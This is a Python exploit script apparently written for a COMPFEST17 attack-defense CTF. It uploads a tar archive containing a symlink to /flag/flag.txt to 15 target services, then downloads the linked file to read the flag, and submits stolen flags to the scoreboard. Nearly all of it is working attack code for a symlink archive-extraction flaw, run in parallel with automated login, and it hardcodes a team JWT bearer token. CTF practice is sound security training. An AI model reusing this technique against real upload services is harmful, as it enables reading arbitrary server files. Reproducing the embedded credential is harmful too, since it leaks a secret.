#!/usr/bin/env python3
import os, re, sys, json, time, tarfile, tempfile, argparse, hashlib
from typing import List, Set, Dict, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

# -------------------------
# CONFIG
# -------------------------
API_HOST = "https://api.ctf-compfest.com"
SUBMIT_URL = f"{API_HOST.rstrip('/')}/api/v2/submit"

TEAM_JWT = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc1OTAyNDc1MiwianRpIjoiZDkyYzNmY2EtZGVkOS00MjM3LTk5OTctM2IzOWZiYzg1YzQwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6eyJ0ZWFtIjp7ImlkIjoxNywibmFtZSI6ImF5byBkYWZ0YXIgQVJLQVZJRElBIn19LCJuYmYiOjE3NTkwMjQ3NTIsImV4cCI6MTc1OTA2Nzk1Mn0.W-od2PiJjaeUsEGkWzG_lSFP1JXBZXpfHT2OFX_XlfOZttt5HKycV0Zorv2UprquOnma6wfEy3AhyMQTdn1OkQ"

TARGETS = [
    "10.0.38.8:40001",
    "10.0.38.8:40003",
    "10.0.38.8:40005",
    "10.0.38.8:40007",
    "10.0.38.8:40009",
    "10.0.38.8:40011",
    "10.0.38.8:40013",
    "10.0.38.8:40015",
    "10.0.38.8:40017",
    "10.0.38.8:40019",
    "10.0.38.8:40021",
    "10.0.38.8:40023",
    "10.0.38.8:40025",
    "10.0.38.8:40027",
    "10.0.38.8:40029",
]

# Web service paths
UPLOAD_PATH = "/api/bundles"
FILE_PATH_FMT = "/api/file/{bid}/{name}"

# Auth paths (we'll try both '/api/...' and bare '/...')
AUTH_TRY_PATHS = [
    ("/api/anonymous-login", "anon"),
    ("/anonymous-login", "anon"),
    ("/api/register", "register"),
    ("/register", "register"),
    ("/api/login", "login"),
    ("/login", "login"),
]

# Symlink name and target
LINK_NAME = "secret"
TARGET_FLAG_PATH = "/flag/flag.txt"

# Parallelism & timeouts
MAX_WORKERS = 12
HTTP_TIMEOUT = 15  # seconds per request

# Only accept COMPFEST flags
FLAG_RE = re.compile(r"COMPFEST17\{[^}]+\}")


# -------------------------
# Helpers
# -------------------------
def make_tar_with_symlink(target_path: str, link_name: str) -> str:
    tmpdir = tempfile.mkdtemp(prefix="poc_")
    lpath = os.path.join(tmpdir, link_name)
    tpath = os.path.join(tmpdir, "poc.tar")
    try:
        if os.path.lexists(lpath):
            os.remove(lpath)
    except Exception:
        pass
    os.symlink(target_path, lpath)
    with tarfile.open(tpath, "w") as tf:
        tf.add(lpath, arcname=link_name, recursive=False)
    return tpath


def base_url(host: str, port: int) -> str:
    return f"http://{host}:{port}"


def _try_json(
    session: requests.Session, method: str, url: str, payload: dict
) -> requests.Response:
    return session.request(method, url, json=payload, timeout=HTTP_TIMEOUT)


def ensure_session_for_target(
    host: str, port: int, fixed_token: str
) -> requests.Session:
    """
    Returns a requests.Session authenticated against the target.
    Prefers anonymous-login; falls back to register->login with deterministic creds.
    (Augmented to also try the /api/auth/* paths listed by the service.)
    """
    s = requests.Session()
    b = base_url(host, port)

    # Build candidate paths: keep your AUTH_TRY_PATHS, then add /api/auth/* variants
    extra = [
        ("/api/auth/anonymous-login", "anon"),
        ("/api/auth/register", "register"),
        ("/api/auth/login", "login"),
    ]
    # Preserve order: try your originals first, then the /api/auth/* endpoints
    candidates = list(AUTH_TRY_PATHS) + extra

    # 1) Try anonymous-login with a constant token
    for path, kind in candidates:
        if kind != "anon":
            continue
        url = b + path
        try:
            resp = _try_json(s, "POST", url, {"token": fixed_token})
            if resp.status_code == 200:
                # cookie should be set by setSessionCookie; requests.Session will keep it
                return s
        except requests.RequestException:
            pass

    # 2) Deterministic register/login
    uname = f"auto_{host.replace('.','-')}_{port}"
    pw = hashlib.sha256(f"{uname}|{fixed_token}".encode()).hexdigest()[:16]

    # Register
    for path, kind in candidates:
        if kind != "register":
            continue
        url = b + path
        try:
            resp = _try_json(
                s,
                "POST",
                url,
                {"username": uname, "password": pw, "displayName": uname[:20]},
            )
            if resp.status_code == 200:
                return s
            if resp.status_code == 409:
                break  # already exists -> login
        except requests.RequestException:
            continue

    # Login
    for path, kind in candidates:
        if kind != "login":
            continue
        url = b + path
        try:
            resp = _try_json(s, "POST", url, {"username": uname, "password": pw})
            if resp.status_code == 200:
                return s
        except requests.RequestException:
            continue

    raise RuntimeError(f"auth failed for {host}:{port}")


def run_once(
    host: str, port: int, archive_path: str, fixed_token: str
) -> Tuple[str, List[str]]:
    """
    Acquire session -> upload tar -> download linked file -> extract flags.
    """
    flags: List[str] = []
    b = base_url(host, port)

    # Auth & cookie
    try:
        sess = ensure_session_for_target(host, port, fixed_token)
    except Exception as e:
        print(f"[!] {host}:{port} auth error: {e}", file=sys.stderr)
        return f"{host}:{port}", flags

    # 1) upload
    up_url = b + UPLOAD_PATH
    try:
        with open(archive_path, "rb") as f:
            files = {"archive": ("poc.tar", f, "application/x-tar")}
            r = sess.post(up_url, files=files, timeout=HTTP_TIMEOUT)
    except Exception as e:
        print(f"[!] {host}:{port} upload error: {e}", file=sys.stderr)
        return f"{host}:{port}", flags

    if r.status_code != 200:
        print(
            f"[!] {host}:{port} upload HTTP {r.status_code}: {r.text[:200]}",
            file=sys.stderr,
        )
        return f"{host}:{port}", flags

    try:
        j = r.json()
    except Exception:
        print(
            f"[!] {host}:{port} non-JSON upload body: {r.text[:200]}", file=sys.stderr
        )
        return f"{host}:{port}", flags

    bid = (
        j.get("id")
        or (j.get("data", {}).get("id") if isinstance(j.get("data"), dict) else None)
        or (j.get("data") if isinstance(j.get("data"), str) else None)
    )
    if not bid:
        print(
            f"[!] {host}:{port} cannot parse bundle id from: {json.dumps(j)[:200]}",
            file=sys.stderr,
        )
        return f"{host}:{port}", flags

    # 2) download linked file
    dl_url = b + FILE_PATH_FMT.format(bid=bid, name=LINK_NAME)
    try:
        r2 = sess.get(dl_url, timeout=HTTP_TIMEOUT)
    except Exception as e:
        print(f"[!] {host}:{port} download error: {e}", file=sys.stderr)
        return f"{host}:{port}", flags

    if r2.status_code != 200:
        print(
            f"[!] {host}:{port} download HTTP {r2.status_code}: {r2.text[:200]}",
            file=sys.stderr,
        )
        return f"{host}:{port}", flags

    body = r2.text
    seen_local: Set[str] = set()
    for m in FLAG_RE.finditer(body):
        f = m.group(0)
        if f not in seen_local:
            seen_local.add(f)
            flags.append(f)

    return f"{host}:{port}", flags


def submit_flags(flags: List[str], jwt: str) -> Dict[str, str]:
    """
    Submit list of flags. Returns {flag: verdict}. Handles 429 with backoff.
    """
    if not flags:
        return {}
    headers = {"Authorization": f"Bearer {jwt}"}
    payload = {"flags": flags}

    backoff = 1.0
    for _ in range(5):
        try:
            resp = requests.post(SUBMIT_URL, json=payload, headers=headers, timeout=15)
        except Exception as e:
            print(f"[!] submit error: {e}", file=sys.stderr)
            time.sleep(backoff)
            backoff = min(backoff * 2, 60.0)
            continue

        if resp.status_code == 200:
            out: Dict[str, str] = {}
            try:
                data = resp.json().get("data", [])
                for item in data:
                    flag = item.get("flag")
                    verdict = item.get("verdict")
                    if flag:
                        out[flag] = verdict or ""
            except Exception:
                print(f"[!] bad JSON in submit 200: {resp.text[:400]}", file=sys.stderr)
            return out

        if resp.status_code == 429:
            print("[!] submit 429 rate-limited; backing off...", file=sys.stderr)
            time.sleep(backoff)
            backoff = min(backoff * 2, 60.0)
            continue

        print(
            f"[!] submit {resp.status_code}: {resp.text.strip()[:400]}", file=sys.stderr
        )
        return {}
    return {}


# -------------------------
# MAIN
# -------------------------
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--jwt", default=TEAM_JWT)
    ap.add_argument("--targets", nargs="*", default=TARGETS)
    ap.add_argument("--workers", type=int, default=MAX_WORKERS)
    ap.add_argument(
        "--fixed-token",
        default="compfest-auto-anon-token",
        help="token used for anonymous-login; same per run",
    )
    ap.add_argument("--flag-path", default=TARGET_FLAG_PATH)
    ap.add_argument("--link-name", default=LINK_NAME)
    args = ap.parse_args()

    if not args.targets:
        print(
            "[!] no targets configured. Edit TARGETS or pass --targets", file=sys.stderr
        )
        return
    if not args.jwt or args.jwt.startswith("REPLACE_"):
        print(
            "[!] TEAM_JWT missing. Provide a valid JWT via --jwt or in the file.",
            file=sys.stderr,
        )
        return

    # prepare archive once
    archive = make_tar_with_symlink(args.flag_path, args.link_name)

    print(f"[*] attacking {len(args.targets)} targets with {args.workers} workers")
    all_flags: List[str] = []
    seen: Set[str] = set()

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = []
        for t in args.targets:
            host, port_s = t.split(":")
            futs.append(
                ex.submit(run_once, host, int(port_s), archive, args.fixed_token)
            )
        for fut in as_completed(futs):
            target, flags = fut.result()
            if flags:
                print(f"[+] {target}: {len(flags)} flag(s)")
            for f in flags:
                if f not in seen:
                    seen.add(f)
                    all_flags.append(f)

    if not all_flags:
        print("[*] no flags found")
        return

    print(f"[*] submitting {len(all_flags)} unique flag(s)")
    verdicts = submit_flags(all_flags, args.jwt)
    if not verdicts:
        print("[!] submit returned no results (see stderr for details)")
        return

    for f in all_flags:
        print(f"{f} -> {verdicts.get(f, 'no verdict')}")


if __name__ == "__main__":
    main()
